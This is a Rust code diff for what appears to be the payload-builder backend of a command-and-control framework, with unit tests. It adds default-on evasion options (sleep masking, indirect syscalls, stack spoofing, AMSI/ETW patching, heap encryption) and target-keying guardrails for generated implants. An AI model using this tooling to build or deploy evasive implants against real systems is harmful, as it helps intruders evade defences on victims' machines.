@@ -37,17 +37,31 @@ pub struct BuildRequest {
     #[serde(default)]                       pub sni_override:    Option<String>,
     #[serde(default)]                       pub alpn_protocols:  Vec<String>,
     // ── Feature 3: Hibernation / dweller mode ─────────────────────────
-    #[serde(default)]                       pub hibernation_mode: bool,
-    #[serde(default)]                       pub batch_size:       Option<u32>,
+    #[serde(default)]                            pub hibernation_mode: bool,
+    #[serde(default)]                            pub batch_size:       Option<u32>,
+    // ── Evasion ───────────────────────────────────────────────────────
+    #[serde(default = "default_sleep_mask")]     pub sleep_mask:        String,
+    #[serde(default = "default_true")]           pub indirect_syscalls: bool,
+    #[serde(default = "default_true")]           pub stack_spoof:       bool,
+    #[serde(default = "default_true")]           pub patch_amsi_etw:    bool,
+    #[serde(default = "default_true")]           pub heap_encrypt:      bool,
+    // ── Execution guardrails ──────────────────────────────────────────
+    #[serde(default)]                            pub guard_domain:      String,
+    #[serde(default)]                            pub guard_hostname:    String,
+    #[serde(default)]                            pub guard_hour_start:  u8,
+    #[serde(default)]                            pub guard_hour_end:    u8,
+    #[serde(default)]                            pub guard_no_system:   bool,
 }
 
-fn default_platform()  -> String { "linux".into() }
-fn default_transport() -> String { "tls".into() }
-fn default_profile()   -> String { "default".into() }
-fn default_format()    -> String { "exe".into() }
-fn default_sleep()     -> u64   { 40 }
-fn default_jmin()      -> u32   { 20 }
-fn default_jmax()      -> u32   { 10 }
+fn default_platform()   -> String { "linux".into() }
+fn default_transport()  -> String { "tls".into() }
+fn default_profile()    -> String { "default".into() }
+fn default_format()     -> String { "exe".into() }
+fn default_sleep()      -> u64   { 40 }
+fn default_jmin()       -> u32   { 20 }
+fn default_jmax()       -> u32   { 10 }
+fn default_sleep_mask() -> String { "ekko".into() }
+fn default_true()       -> bool  { true }
 
 #[derive(Serialize)]
 pub struct BuildStarted { pub job_id: String }
@@ -95,9 +109,69 @@ fn validate_request(req: &BuildRequest) -> Result<(), String> {
         "exe" | "dll" | "service" | "stager" => {}
         o => return Err(format!("invalid format: {}", o)),
     }
+    match req.sleep_mask.as_str() {
+        "none" | "ekko" | "foliage" => {}
+        o => return Err(format!("invalid sleep_mask: {}", o)),
+    }
     if req.jitter_min > 100 { return Err("jitter_min cannot exceed 100".into()); }
     if req.days < 0          { return Err("days must be 0 or positive".into()); }
+    if req.guard_hour_start > 23 { return Err("guard_hour_start must be 0–23".into()); }
+    if req.guard_hour_end   > 23 { return Err("guard_hour_end must be 0–23".into()); }
     Ok(())
+}
+
+// ── CLI arg construction (extracted for testability) ───────────────────
+
+pub fn build_args(req: &BuildRequest) -> Vec<String> {
+    let mut args: Vec<String> = vec![
+        "--host".into(),       req.host.clone(),
+        "--port".into(),       req.port.clone(),
+        "--platform".into(),   req.platform.clone(),
+        "--transport".into(),  req.transport.replace('_', "-"),
+        "--profile".into(),    req.profile.replace('_', "-"),
+        "--format".into(),     req.format.clone(),
+        "--sleep".into(),      req.sleep.to_string(),
+        "--jitter-min".into(), req.jitter_min.to_string(),
+        "--jitter-max".into(), req.jitter_max.to_string(),
+        "--bloat".into(),      req.bloat.to_string(),
+        "--days".into(),       req.days.to_string(),
+    ];
+    if req.debug { args.push("--debug".into()); }
+    if let Some(sni) = &req.sni_override {
+        args.push("--sni".into());
+        args.push(sni.clone());
+    }
+    if !req.alpn_protocols.is_empty() {
+        args.push("--alpn".into());
+        args.push(req.alpn_protocols.join(","));
+    }
+    if req.hibernation_mode { args.push("--hibernation".into()); }
+    if let Some(bs) = req.batch_size {
+        args.push("--batch-size".into());
+        args.push(bs.to_string());
+    }
+    // Evasion
+    args.push("--sleep-mask".into());
+    args.push(req.sleep_mask.clone());
+    args.extend(["--indirect-syscalls".into(), req.indirect_syscalls.to_string()]);
+    args.extend(["--stack-spoof".into(),       req.stack_spoof.to_string()]);
+    args.extend(["--patch-amsi-etw".into(),    req.patch_amsi_etw.to_string()]);
+    args.extend(["--heap-encrypt".into(),      req.heap_encrypt.to_string()]);
+    // Guardrails
+    if !req.guard_domain.is_empty() {
+        args.push("--guard-domain".into());
+        args.push(req.guard_domain.clone());
+    }
+    if !req.guard_hostname.is_empty() {
+        args.push("--guard-hostname".into());
+        args.push(req.guard_hostname.clone());
+    }
+    if req.guard_hour_start > 0 || req.guard_hour_end > 0 {
+        args.push("--guard-hours".into());
+        args.push(format!("{}-{}", req.guard_hour_start, req.guard_hour_end));
+    }
+    if req.guard_no_system { args.push("--guard-no-system".into()); }
+    args
 }
 
 // ── Route handlers ─────────────────────────────────────────────────────
@@ -148,35 +222,7 @@ pub async fn start_build(
     let jid      = job_id.clone();
 
     tokio::spawn(async move {
-        let mut args: Vec<String> = vec![
-            "--host".into(),        req.host.clone(),
-            "--port".into(),        req.port.clone(),
-            "--platform".into(),    req.platform.clone(),
-            "--transport".into(),   req.transport.replace('_', "-"),
-            "--profile".into(),     req.profile.replace('_', "-"),
-            "--format".into(),      req.format.clone(),
-            "--sleep".into(),       req.sleep.to_string(),
-            "--jitter-min".into(),  req.jitter_min.to_string(),
-            "--jitter-max".into(),  req.jitter_max.to_string(),
-            "--bloat".into(),       req.bloat.to_string(),
-            "--days".into(),        req.days.to_string(),
-        ];
-        if req.debug { args.push("--debug".into()); }
-        if let Some(sni) = &req.sni_override {
-            args.push("--sni".into());
-            args.push(sni.clone());
-        }
-        if !req.alpn_protocols.is_empty() {
-            args.push("--alpn".into());
-            args.push(req.alpn_protocols.join(","));
-        }
-        if req.hibernation_mode {
-            args.push("--hibernation".into());
-        }
-        if let Some(bs) = req.batch_size {
-            args.push("--batch-size".into());
-            args.push(bs.to_string());
-        }
+        let args = build_args(&req);
 
         fn push(jobs: &std::sync::Arc<std::sync::Mutex<std::collections::HashMap<String, BuildJob>>>,
                 id: &str, line: String) {
@@ -347,5 +393,540 @@ pub async fn download_artifact(
                 bytes,
             ).into_response()
         }
+    }
+}
+
+// ── Tests ──────────────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── Fixtures ───────────────────────────────────────────────────────
+
+    fn base_req() -> BuildRequest {
+        BuildRequest {
+            host:              "10.0.0.1".into(),
+            port:              "4443".into(),
+            platform:          "linux".into(),
+            transport:         "tls".into(),
+            profile:           "default".into(),
+            format:            "exe".into(),
+            sleep:             40,
+            jitter_min:        20,
+            jitter_max:        10,
+            bloat:             0,
+            debug:             false,
+            days:              0,
+            sni_override:      None,
+            alpn_protocols:    vec![],
+            hibernation_mode:  false,
+            batch_size:        None,
+            sleep_mask:        "ekko".into(),
+            indirect_syscalls: true,
+            stack_spoof:       true,
+            patch_amsi_etw:    true,
+            heap_encrypt:      true,
+            guard_domain:      String::new(),
+            guard_hostname:    String::new(),
+            guard_hour_start:  0,
+            guard_hour_end:    0,
+            guard_no_system:   false,
+        }
+    }
+
+    fn has_pair(args: &[String], flag: &str, val: &str) -> bool {
+        args.windows(2).any(|w| w[0] == flag && w[1] == val)
+    }
+
+    fn from_json(s: &str) -> BuildRequest {
+        serde_json::from_str(s).expect("valid JSON")
+    }
+
+    // ── validate_request ───────────────────────────────────────────────
+
+    #[test]
+    fn validate_ok_baseline() {
+        assert!(validate_request(&base_req()).is_ok());
+    }
+
+    #[test]
+    fn validate_err_missing_host() {
+        let mut r = base_req(); r.host = String::new();
+        assert!(validate_request(&r).is_err());
+    }
+
+    #[test]
+    fn validate_err_missing_port() {
+        let mut r = base_req(); r.port = String::new();
+        assert!(validate_request(&r).is_err());
+    }
+
+    #[test]
+    fn validate_ok_all_platforms() {
+        for p in ["linux", "windows", "macos"] {
+            let mut r = base_req(); r.platform = p.into();
+            assert!(validate_request(&r).is_ok(), "platform={p}");
+        }
+    }
+
+    #[test]
+    fn validate_err_unknown_platform() {
+        let mut r = base_req(); r.platform = "android".into();
+        assert!(validate_request(&r).unwrap_err().contains("platform"));
+    }
+
+    #[test]
+    fn validate_ok_all_transports() {
+        for t in ["tls", "tcp_plain", "named_pipe", "http", "https"] {
+            let mut r = base_req(); r.transport = t.into();
+            assert!(validate_request(&r).is_ok(), "transport={t}");
+        }
+    }
+
+    #[test]
+    fn validate_err_unknown_transport() {
+        let mut r = base_req(); r.transport = "udp".into();
+        assert!(validate_request(&r).unwrap_err().contains("transport"));
+    }
+
+    #[test]
+    fn validate_ok_all_formats() {
+        for f in ["exe", "dll", "service", "stager"] {
+            let mut r = base_req(); r.format = f.into();
+            assert!(validate_request(&r).is_ok(), "format={f}");
+        }
+    }
+
+    #[test]
+    fn validate_err_unknown_format() {
+        let mut r = base_req(); r.format = "apk".into();
+        assert!(validate_request(&r).unwrap_err().contains("format"));
+    }
+
+    #[test]
+    fn validate_ok_sleep_mask_all_variants() {
+        for m in ["none", "ekko", "foliage"] {
+            let mut r = base_req(); r.sleep_mask = m.into();
+            assert!(validate_request(&r).is_ok(), "sleep_mask={m}");
+        }
+    }
+
+    #[test]
+    fn validate_err_unknown_sleep_mask() {
+        let mut r = base_req(); r.sleep_mask = "custom".into();
+        assert!(validate_request(&r).unwrap_err().contains("sleep_mask"));
+    }
+
+    #[test]
+    fn validate_err_jitter_min_over_100() {
+        let mut r = base_req(); r.jitter_min = 101;
+        assert!(validate_request(&r).is_err());
+    }
+
+    #[test]
+    fn validate_ok_jitter_min_at_boundary() {
+        let mut r = base_req(); r.jitter_min = 100;
+        assert!(validate_request(&r).is_ok());
+    }
+
+    #[test]
+    fn validate_err_negative_days() {
+        let mut r = base_req(); r.days = -1;
+        assert!(validate_request(&r).is_err());
+    }
+
+    #[test]
+    fn validate_ok_days_zero() {
+        let r = base_req();
+        assert!(validate_request(&r).is_ok());
+    }
+
+    #[test]
+    fn validate_err_guard_hour_start_over_23() {
+        let mut r = base_req(); r.guard_hour_start = 24;
+        assert!(validate_request(&r).unwrap_err().contains("guard_hour_start"));
+    }
+
+    #[test]
+    fn validate_err_guard_hour_end_over_23() {
+        let mut r = base_req(); r.guard_hour_end = 24;
+        assert!(validate_request(&r).unwrap_err().contains("guard_hour_end"));
+    }
+
+    #[test]
+    fn validate_ok_guard_hours_boundary_values() {
+        let mut r = base_req();
+        r.guard_hour_start = 0;
+        r.guard_hour_end   = 23;
+        assert!(validate_request(&r).is_ok());
+    }
+
+    // ── build_args ────────────────────────────────────────────────────
+
+    #[test]
+    fn args_core_fields_present() {
+        let r = base_req();
+        let a = build_args(&r);
+        assert!(has_pair(&a, "--host",      "10.0.0.1"));
+        assert!(has_pair(&a, "--port",      "4443"));
+        assert!(has_pair(&a, "--platform",  "linux"));
+        assert!(has_pair(&a, "--transport", "tls"));
+        assert!(has_pair(&a, "--format",    "exe"));
+        assert!(has_pair(&a, "--sleep",     "40"));
+        assert!(has_pair(&a, "--jitter-min","20"));
+        assert!(has_pair(&a, "--jitter-max","10"));
+    }
+
+    #[test]
+    fn args_transport_underscore_converted_to_dash() {
+        let mut r = base_req(); r.transport = "tcp_plain".into();
+        assert!(has_pair(&build_args(&r), "--transport", "tcp-plain"));
+    }
+
+    #[test]
+    fn args_profile_underscore_converted_to_dash() {
+        let mut r = base_req(); r.profile = "http_post".into();
+        assert!(has_pair(&build_args(&r), "--profile", "http-post"));
+    }
+
+    #[test]
+    fn args_debug_flag_included_when_true() {
+        let mut r = base_req(); r.debug = true;
+        assert!(build_args(&r).contains(&"--debug".to_string()));
+    }
+
+    #[test]
+    fn args_debug_flag_omitted_when_false() {
+        assert!(!build_args(&base_req()).contains(&"--debug".to_string()));
+    }
+
+    #[test]
+    fn args_sleep_mask_always_forwarded() {
+        for m in ["none", "ekko", "foliage"] {
+            let mut r = base_req(); r.sleep_mask = m.into();
+            assert!(has_pair(&build_args(&r), "--sleep-mask", m), "sleep_mask={m}");
+        }
+    }
+
+    #[test]
+    fn args_evasion_flags_all_on() {
+        let r = base_req();
+        let a = build_args(&r);
+        assert!(has_pair(&a, "--indirect-syscalls", "true"));
+        assert!(has_pair(&a, "--stack-spoof",       "true"));
+        assert!(has_pair(&a, "--patch-amsi-etw",    "true"));
+        assert!(has_pair(&a, "--heap-encrypt",      "true"));
+    }
+
+    #[test]
+    fn args_evasion_flags_all_off() {
+        let mut r = base_req();
+        r.indirect_syscalls = false;
+        r.stack_spoof       = false;
+        r.patch_amsi_etw    = false;
+        r.heap_encrypt      = false;
+        let a = build_args(&r);
+        assert!(has_pair(&a, "--indirect-syscalls", "false"));
+        assert!(has_pair(&a, "--stack-spoof",       "false"));
+        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
+        assert!(has_pair(&a, "--heap-encrypt",      "false"));
+    }
+
+    #[test]
+    fn args_evasion_flags_independently_toggled() {
+        let mut r = base_req();
+        r.indirect_syscalls = false; r.stack_spoof = false;
+        r.patch_amsi_etw    = false; r.heap_encrypt = false;
+
+        r.indirect_syscalls = true;
+        let a = build_args(&r);
+        assert!(has_pair(&a, "--indirect-syscalls", "true"));
+        assert!(has_pair(&a, "--stack-spoof",       "false"));
+        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
+        assert!(has_pair(&a, "--heap-encrypt",      "false"));
+    }
+
+    #[test]
+    fn args_guard_domain_included_when_set() {
+        let mut r = base_req(); r.guard_domain = "CORP*".into();
+        assert!(has_pair(&build_args(&r), "--guard-domain", "CORP*"));
+    }
+
+    #[test]
+    fn args_guard_domain_omitted_when_empty() {
+        assert!(!build_args(&base_req()).contains(&"--guard-domain".to_string()));
+    }
+
+    #[test]
+    fn args_guard_hostname_included_when_set() {
+        let mut r = base_req(); r.guard_hostname = "DESKTOP-*".into();
+        assert!(has_pair(&build_args(&r), "--guard-hostname", "DESKTOP-*"));
+    }
+
+    #[test]
+    fn args_guard_hostname_omitted_when_empty() {
+        assert!(!build_args(&base_req()).contains(&"--guard-hostname".to_string()));
+    }
+
+    #[test]
+    fn args_guard_hours_formatted_correctly() {
+        let mut r = base_req();
+        r.guard_hour_start = 8;
+        r.guard_hour_end   = 18;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "8-18"));
+    }
+
+    #[test]
+    fn args_guard_hours_omitted_when_both_zero() {
+        assert!(!build_args(&base_req()).contains(&"--guard-hours".to_string()));
+    }
+
+    #[test]
+    fn args_guard_hours_included_when_only_start_set() {
+        let mut r = base_req(); r.guard_hour_start = 9;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "9-0"));
+    }
+
+    #[test]
+    fn args_guard_hours_included_when_only_end_set() {
+        let mut r = base_req(); r.guard_hour_end = 17;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
+    }
+
+    #[test]
+    fn args_guard_no_system_included_when_true() {
+        let mut r = base_req(); r.guard_no_system = true;
+        assert!(build_args(&r).contains(&"--guard-no-system".to_string()));
+    }
+
+    #[test]
+    fn args_guard_no_system_omitted_when_false() {
+        assert!(!build_args(&base_req()).contains(&"--guard-no-system".to_string()));
+    }
+
+    #[test]
+    fn args_sni_included_when_set() {
+        let mut r = base_req(); r.sni_override = Some("cdn.example.com".into());
+        assert!(has_pair(&build_args(&r), "--sni", "cdn.example.com"));
+    }
+
+    #[test]
+    fn args_sni_omitted_when_none() {
+        assert!(!build_args(&base_req()).contains(&"--sni".to_string()));
+    }
+
+    #[test]
+    fn args_alpn_joined_with_comma() {
+        let mut r = base_req(); r.alpn_protocols = vec!["h2".into(), "http/1.1".into()];
+        assert!(has_pair(&build_args(&r), "--alpn", "h2,http/1.1"));
+    }
+
+    #[test]
+    fn args_alpn_omitted_when_empty() {
+        assert!(!build_args(&base_req()).contains(&"--alpn".to_string()));
+    }
+
+    #[test]
+    fn args_hibernation_flag() {
+        let mut r = base_req(); r.hibernation_mode = true;
+        assert!(build_args(&r).contains(&"--hibernation".to_string()));
+    }
+
+    #[test]
+    fn args_hibernation_omitted_when_false() {
+        assert!(!build_args(&base_req()).contains(&"--hibernation".to_string()));
+    }
+
+    #[test]
+    fn args_batch_size_forwarded() {
+        let mut r = base_req(); r.batch_size = Some(5);
+        assert!(has_pair(&build_args(&r), "--batch-size", "5"));
+    }
+
+    #[test]
+    fn args_batch_size_omitted_when_none() {
+        assert!(!build_args(&base_req()).contains(&"--batch-size".to_string()));
+    }
+
+    // ── Serde defaults ────────────────────────────────────────────────
+
+    #[test]
+    fn serde_defaults_evasion_on() {
+        let r = from_json(r#"{"host":"h","port":"p"}"#);
+        assert_eq!(r.sleep_mask, "ekko");
+        assert!(r.indirect_syscalls, "indirect_syscalls should default true");
+        assert!(r.stack_spoof,       "stack_spoof should default true");
+        assert!(r.patch_amsi_etw,    "patch_amsi_etw should default true");
+        assert!(r.heap_encrypt,      "heap_encrypt should default true");
+    }
+
+    #[test]
+    fn serde_defaults_guardrails_off() {
+        let r = from_json(r#"{"host":"h","port":"p"}"#);
+        assert_eq!(r.guard_domain,     "");
+        assert_eq!(r.guard_hostname,   "");
+        assert_eq!(r.guard_hour_start, 0);
+        assert_eq!(r.guard_hour_end,   0);
+        assert!(!r.guard_no_system);
+    }
+
+    #[test]
+    fn serde_evasion_selectively_disabled() {
+        let r = from_json(
+            r#"{"host":"h","port":"p","indirect_syscalls":false,"patch_amsi_etw":false}"#,
+        );
+        assert!(!r.indirect_syscalls);
+        assert!(!r.patch_amsi_etw);
+        assert!(r.stack_spoof,  "unspecified field should still default true");
+        assert!(r.heap_encrypt, "unspecified field should still default true");
+    }
+
+    #[test]
+    fn serde_sleep_mask_explicit_foliage() {
+        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"foliage"}"#);
+        assert_eq!(r.sleep_mask, "foliage");
+    }
+
+    #[test]
+    fn serde_sleep_mask_explicit_none() {
+        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"none"}"#);
+        assert_eq!(r.sleep_mask, "none");
+    }
+
+    #[test]
+    fn serde_guardrails_fully_populated() {
+        let r = from_json(r#"{
+            "host":"h","port":"p",
+            "guard_domain":"CORP*",
+            "guard_hostname":"DESKTOP-*",
+            "guard_hour_start":8,
+            "guard_hour_end":18,
+            "guard_no_system":true
+        }"#);
+        assert_eq!(r.guard_domain,     "CORP*");
+        assert_eq!(r.guard_hostname,   "DESKTOP-*");
+        assert_eq!(r.guard_hour_start, 8);
+        assert_eq!(r.guard_hour_end,   18);
+        assert!(r.guard_no_system);
+    }
+
+    #[test]
+    fn serde_defaults_core_fields() {
+        let r = from_json(r#"{"host":"h","port":"p"}"#);
+        assert_eq!(r.platform,   "linux");
+        assert_eq!(r.transport,  "tls");
+        assert_eq!(r.profile,    "default");
+        assert_eq!(r.format,     "exe");
+        assert_eq!(r.sleep,      40);
+        assert_eq!(r.jitter_min, 20);
+        assert_eq!(r.jitter_max, 10);
+        assert_eq!(r.bloat,      0);
+        assert_eq!(r.days,       0);
+    }
+
+    // ── validate_request — profile ────────────────────────────────────
+
+    #[test]
+    fn validate_ok_all_profiles() {
+        for p in ["default", "http_post", "http_image"] {
+            let mut r = base_req(); r.profile = p.into();
+            assert!(validate_request(&r).is_ok(), "profile={p}");
+        }
+    }
+
+    #[test]
+    fn validate_err_unknown_profile() {
+        let mut r = base_req(); r.profile = "slack".into();
+        assert!(validate_request(&r).unwrap_err().contains("profile"));
+    }
+
+    // ── build_args — core fields not yet explicitly covered ───────────
+
+    #[test]
+    fn args_bloat_nonzero_forwarded() {
+        let mut r = base_req(); r.bloat = 10;
+        assert!(has_pair(&build_args(&r), "--bloat", "10"));
+    }
+
+    #[test]
+    fn args_bloat_zero_still_forwarded() {
+        assert!(has_pair(&build_args(&base_req()), "--bloat", "0"));
+    }
+
+    #[test]
+    fn args_days_nonzero_forwarded() {
+        let mut r = base_req(); r.days = 30;
+        assert!(has_pair(&build_args(&r), "--days", "30"));
+    }
+
+    #[test]
+    fn args_days_zero_still_forwarded() {
+        assert!(has_pair(&build_args(&base_req()), "--days", "0"));
+    }
+
+    #[test]
+    fn args_platform_windows_forwarded() {
+        let mut r = base_req(); r.platform = "windows".into();
+        assert!(has_pair(&build_args(&r), "--platform", "windows"));
+    }
+
+    #[test]
+    fn args_platform_macos_forwarded() {
+        let mut r = base_req(); r.platform = "macos".into();
+        assert!(has_pair(&build_args(&r), "--platform", "macos"));
+    }
+
+    #[test]
+    fn args_format_dll_forwarded() {
+        let mut r = base_req(); r.format = "dll".into();
+        assert!(has_pair(&build_args(&r), "--format", "dll"));
+    }
+
+    #[test]
+    fn args_format_stager_forwarded() {
+        let mut r = base_req(); r.format = "stager".into();
+        assert!(has_pair(&build_args(&r), "--format", "stager"));
+    }
+
+    // ── build_args — guard hours edge cases ──────────────────────────
+
+    #[test]
+    fn args_guard_hours_only_end_set() {
+        let mut r = base_req(); r.guard_hour_end = 17;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
+    }
+
+    #[test]
+    fn args_guard_hours_max_boundary() {
+        let mut r = base_req();
+        r.guard_hour_start = 23;
+        r.guard_hour_end   = 23;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "23-23"));
+    }
+
+    #[test]
+    fn args_guard_hours_full_day_window() {
+        let mut r = base_req();
+        r.guard_hour_start = 0;
+        r.guard_hour_end   = 23;
+        assert!(has_pair(&build_args(&r), "--guard-hours", "0-23"));
+    }
+
+    // ── build_args — no unexpected duplicates ─────────────────────────
+
+    #[test]
+    fn args_sleep_mask_appears_exactly_once() {
+        let r = base_req();
+        let a = build_args(&r);
+        let count = a.iter().filter(|s| s.as_str() == "--sleep-mask").count();
+        assert_eq!(count, 1, "--sleep-mask should appear exactly once");
+    }
+
+    #[test]
+    fn args_host_appears_exactly_once() {
+        let r = base_req();
+        let a = build_args(&r);
+        assert_eq!(a.iter().filter(|s| s.as_str() == "--host").count(), 1);
     }
 }
